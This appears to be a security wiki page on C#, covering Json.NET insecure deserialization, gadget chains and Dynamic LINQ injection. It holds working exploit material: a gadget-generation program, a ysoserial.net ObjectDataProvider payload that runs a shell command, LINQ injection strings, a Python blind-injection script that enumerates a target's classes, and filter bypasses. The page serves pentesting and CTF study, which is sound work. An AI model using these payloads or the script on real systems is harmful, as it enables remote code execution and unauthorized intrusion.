---
description: C Sharp and the .NET Framework
---

# C\#

## Hello World

The first step is creating a new project. With the `console` template for a simple CLI app, you can easily fill an empty directory with the necessary files:

{% code title="Create new project" %}
```bash
mkdir HelloWorld && cd HelloWorld
dotnet new console
```
{% endcode %}

You can find external packages in the [NuGet Gallery](https://www.nuget.org/), and then add them to your project:

```bash
dotnet add package Newtonsoft.Json
```

Finally, run the main `Program.cs` file:

```bash
dotnet run
```

## Deserialization

There are different ways to serialize objects in C#, which is the process of turning it into a string. Then, this string can be passed around through other channels and eventually be **deserialized** to receive an identical copy of the original object.

Creating arbitrary objects with fields is dangerous when this deserialized string is in the attacker's control. By abusing lax configuration, you can instantiate objects with special behavior to read/write files, or even achieve Remote Code Execution if the right gadgets are accessible.

### Newtonsoft Json.NET

The most common form on deserialization in the web is JSON. The [Json.NET](https://www.newtonsoft.com/json) library is the most widely-used for turning some string from the user into an instance of a class. The fields on this class define the structure of the JSON, for example ([source](https://www.newtonsoft.com/json/help/html/DeserializeObject.htm)):

<pre class="language-csharp"><code class="lang-csharp">public class Account {
<strong>    public string Email { get; set; }
</strong><strong>    public bool Active { get; set; }
</strong><strong>    public DateTime CreatedDate { get; set; }
</strong><strong>    public IList&#x3C;string> Roles { get; set; }
</strong>}

string json = @"{
  'Email': 'james@example.com',
  'Active': true,
  'CreatedDate': '2013-01-20T00:00:00Z',
  'Roles': [
    'User',
    'Admin'
  ]
}";

<strong>Account account = JsonConvert.DeserializeObject&#x3C;Account>(json);
</strong>Console.WriteLine(account.Email);  // "james@example.com"
</code></pre>

The above example is **secure**, because it only allows deserializing basic data types. It can be wrongly configured, however, to allow all classes instead, which may include dangerous ones we call "gadgets". This is possible if a `JsonSerializerSettings` is given as the 2nd argument with a `.TypeNameHandling` value other than `None`.

<pre class="language-csharp" data-title="Vulnerable Example"><code class="lang-csharp">JsonConvert.DeserializeObject&#x3C;Account>(json, new JsonSerializerSettings {
<strong>    TypeNameHandling = TypeNameHandling.All
</strong><strong>    // Also `.Arrays`, `.Objects` and `.Auto` are vulnerable
</strong>});
</code></pre>

This enables a special `$type` key for each JSON object (also in nested properties) that can reference any loaded class, and set its fields. This is only possible for properties with the `Object` type because all gadgets will inherit from it:

<pre class="language-csharp"><code class="lang-csharp">public class Vulnerable {
    public string Str { get; set; }
<strong>    public Object Obj { get; set; }
</strong>}
</code></pre>

You can easily generate a payload by _serializing_ it first with the same library and classes, then send it to the target. Make sure to include `TypeNameHandling.All` to ensure any types are included and the target can resolve them. You should **structure your classes exactly the same** as the target because the `$type` key includes this information:

<pre class="language-csharp" data-title="Generate Exploit"><code class="lang-csharp">using Newtonsoft.Json;

public class Gadget {
    private string _input;
    public string Input {
        get { return _input; }

<strong>        set {
</strong><strong>            _input = value;
</strong><strong>            // Imagine some dangerous logic here...
</strong><strong>            Console.WriteLine("Command executed: " + value);
</strong><strong>        }
</strong>    }
}

public class Vulnerable {
    public required string Str { get; set; }
    // Dangerous: this allows the `object` type
<strong>    public required object Obj { get; set; }
</strong>}

class Program {
    static void Main() {
        // Serialization
<strong>        Gadget gadget = new Gadget { Input = "calc.exe" };
</strong>        Vulnerable vuln = new Vulnerable {
            Str = "Hello, world!",
            Obj = gadget
        };
<strong>        string json = JsonConvert.SerializeObject(vuln, new JsonSerializerSettings         {
</strong>            TypeNameHandling = TypeNameHandling.All
        });
        Console.WriteLine(json);  // {"$type":"Vulnerable, JsonTest","Str":"test@example.com","Obj":{"$type":"Gadget, JsonTest","Input":"calc.exe"}}

        Console.WriteLine("-> Press enter to continue..."); Console.ReadLine();

        // Deserialization
<strong>        Vulnerable? account = JsonConvert.DeserializeObject&#x3C;Vulnerable>(json, new JsonSerializerSettings {
</strong>            TypeNameHandling = TypeNameHandling.All
        });
        if (account is not null) Console.WriteLine("Result: " + account.Obj);
        else Console.WriteLine("Failed to deserialize");
    }
}
</code></pre>

When ran with `dotnet run`, this will generate the object with payload first, and then serialize it into JSON ready to send to the target. The 2nd part will similar the target receiving the string, and deserializing it into a vulnerable type. You will see that the `set {}` method is called twice:

<pre class="language-json" data-title="Output" data-overflow="wrap"><code class="lang-json">Command executed: calc.exe
<strong>{"$type":"Vulnerable, JsonTest","Str":"test@example.com","Obj":{"$type":"Gadget, JsonTest","Input":"calc.exe"}}
</strong>-> Press enter to continue...

<strong>Command executed: calc.exe
</strong>Result: Gadget
</code></pre>

The syntax is pretty simple, so if you want to, you can even handcraft these payloads. The syntax for the `$type` key is `Path.To.Class, AssemblyName`, where the path to the class is follows the nested structure of namespaces and classes to your gadget.

For another example, see the writeup below:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/nexus-void#json-deserialization" %}
Writeup including a custom Json.NET deserialization chain to execute commands
{% endembed %}

Json.NET is far from the only library allowing arbitrary objects to be deserialized. To get an overflow, see the table below to understand which library supports what features:

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption><p>Table of serializers and what gadgets you can execute with them (<a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15">source</a>)</p></figcaption></figure>

### Gadget Chains

You'll be very lucky if you have the source code of your target application, and find a single setter in there that allows RCE. Instead, you should rely on chains of gadgets, often in widely-used libraries.

One small gadget can maybe call a function on another gadget, which grabs a property from a third gadget to ultimately use it in an unsafe way. It's an art to combine these in creative ways, and requires a good understanding of what's available and possible in the codebase. The `ysoserial.net` tool collects such gadgets and can generate them with payloads at will:

{% embed url="https://github.com/pwntester/ysoserial.net" %}
Collection of gadget chains and generator for serialized input
{% endembed %}

To use it, select a gadget chain with `-g`, select the Formatter with `-f` (eg. `Json.Net`). Most gadgets will achieve RCE, and with the `-c` argument you can customize the final shell command it executes.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ysoserial.net -g ObjectDataProvider -f Json.Net -c 'calc.exe' | tr "'" '"'
</strong>{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd", "/c calc.exe"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
</code></pre>

If the target loads the `PresentationFramework` assembly and you cause it to insecurely deserialize the above payload, the `calc.exe` command will be executed. If the conditions on the target are unknown, you should try many different known chains until one works.

### Finding Gadgets

To find your own gadgets, you should look for code that you are able to trigger during deserialization. These are `get {}` and `set {}` methods as mentioned above, but the **constructor will also be called**. You can pass named arguments to the constructor by your key names, for example:

<pre class="language-csharp"><code class="lang-csharp">public class Gadget {
<strong>    public Gadget(string input, int input2) {
</strong><strong>        Console.WriteLine("Gadget(" + input + ", " + input2 + ")");
</strong><strong>    }
</strong>}
</code></pre>

{% code title="Payload" %}
```json
{"$type":"Gadget, JsonTest","input":"calc.exe", "input2": 1337}
```
{% endcode %}

{% code title="Output" %}
```csharp
Gadget(calc.exe, 1337)
```
{% endcode %}

Some gadgets will call methods on your arguments, such as the `HashMap` calling `.hashCode()` to turn it into a unique integer. This means any vulnerable logic inside an object's `hashCode` implementation will also be callable if we just wrap in in a hashmap! Combing gadgets in chains like this is the standard way to find exploits.

## LINQ Injection

[Language Integrated Query (LINQ)](https://learn.microsoft.com/en-us/dotnet/csharp/linq/) is a Microsoft library for C# used to query objects similar to SQL syntax. It does, however, support C# syntax with function calls embedded inside the syntax, such as:

```csharp
using System.Linq.Dynamic.Core;

var query = products.AsQueryable();
var response = query.Where($"Name.Contains(\"{showProducts.name}\")");
```

The above inserts user input from `showProducts.name` into the `Where()` call, which without sanitization allows an attacker to escape the `"` (double quote) and rewrite the query. For example:

* `X") || 1==1 || "" == ("X`: Shows all products
* `X") || 1==2 || "" == ("X`: Empty array

### Version < 1.3.0 RCE

The following Github Repository and accompanying article explain how to exploit such an injection for consistent Remote Code Execution.

{% embed url="https://github.com/Tris0n/CVE-2023-32571-POC" %}
Proof of Concept of the RCE
{% endembed %}

{% embed url="https://www.nccgroup.com/us/research-blog/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/" %}
Explanation and technical details of how it was found
{% endembed %}

### Latest version property access

[The patch](https://github.com/zzzprojects/System.Linq.Dynamic.Core/commit/3fb84e971abe5fb4d991a2db5f8ad125d075d062#diff-d74bcce2f4faee6ebab990038227298e78241010e3fd6e79fd8f9ab65cb73954L1706) **only restricts method calling to predefined types**. This means that methods on Strings, Arrays, etc. will work, but methods on custom types will not. It is still possible to run methods on custom types that are inherited from allowed classes, and it is still possible to access any properties.

`"".GetType().Module.Assembly` still works to get the _Standard Module_.

`GetType().Module.Assembly` gets the module of the object passed into the `Where()` function, often custom code.

By chaining more properties and using `ToArray()` on enumerables, it is possible to enumerate all classes, attributes, properties and methods in a module. The following script implements this using binary search and requires a `test()` function that injects in such a way that you can evaluate a condition.

<pre class="language-python" data-title="Exploit Script"><code class="lang-python">import requests
from tqdm import tqdm

HOST = "http://localhost:8000"

<strong>def test(condition):
</strong><strong>    data = {
</strong><strong>        "name": f"X\") || {condition} || \"\" == (\"X"
</strong><strong>    }
</strong><strong>    r = requests.post(HOST + "/api/products", json=data)
</strong><strong>    return len(r.json()["products"]) > 0
</strong>
assert test("1==1")
assert not test("1==2")

def binary_search(expression, lo=0, hi=127):
    """Find the value of an integer"""
    while lo &#x3C; hi:
        mid = (lo + hi + 1) // 2
        if test(f"{expression} &#x3C; {mid}"):
            hi = mid - 1
        else:
            lo = mid

    return lo

def find_string(expression):
    length = binary_search(f"{expression}.Length", hi=2**16)

    content = bytes([binary_search(f"{expression}[{i}].CompareTo('\x00')")
                     for i in tqdm(range(length), desc=expression, leave=False)])

    return content.decode()

types = "GetType().Module.Assembly.DefinedTypes"
types_len = binary_search(f"{types}.ToArray().Length")

for type_i in range(types_len):
    type = f"{types}.ToArray()[{type_i}]"
    type_name = find_string(f"{type}.Name")
    print(f"class {type_name} {{")

    properties_len = binary_search(
        f"{type}.DeclaredProperties.ToArray().Length")
    for property_i in range(properties_len):
        property = f"{type}.DeclaredProperties.ToArray()[{property_i}]"
        property_type = find_string(f'{property}.PropertyType.Name')
        property_name = find_string(f'{property}.Name')
        print(f"  {property_type} {property_name} {{ get; set; }}")

    fields_len = binary_search(f"{type}.DeclaredFields.ToArray().Length")
    for field_i in range(fields_len):
        field = f"{type}.DeclaredFields.ToArray()[{field_i}]"
        field_type = find_string(f'{field}.FieldType.Name')
        field_name = find_string(f'{field}.Name')
        print(f"  {field_type} {field_name};")

    print()

    methods_len = binary_search(f"{type}.DeclaredMethods.ToArray().Length")
    for method_i in range(methods_len):
        method = f"{type}.DeclaredMethods.ToArray()[{method_i}]"
        method_return_type = find_string(f"{method}.ReturnType.Name")
        method_name = find_string(f"{method}.Name")
        print(f"  {method_return_type} {method_name}() {{}}")

    print("}\n")
</code></pre>

Example output looks like this (note that some magic members are also added, these can be ignored):

{% code title="Output" %}
```csharp
class <>f__AnonymousType0`1 {
  <Products>j__TPar Products { get; set; }
  <Products>j__TPar <Products>i__Field;

  <Products>j__TPar get_Products() {}
  Boolean Equals() {}
  Int32 GetHashCode() {}
  String ToString() {}
}

class ProductsController {
  String secret;

  String testfunc() {}
  IActionResult Show() {}
}

class Product {
  String Name { get; set; }
  String <Name>k__BackingField;

  String get_Name() {}
  Void set_Name() {}
}

class Program {

  Void <Main>$() {}
}

class ShowProducts {
  String name { get; set; }
  String <name>k__BackingField;

  String get_name() {}
  Void set_name() {}
}
```
{% endcode %}

### Filter Bypasses

1. Any method call like `.GetType()` can be obfuscated as `.@GetType()`
2. Whitespace also works, eg. `.   GetType()`
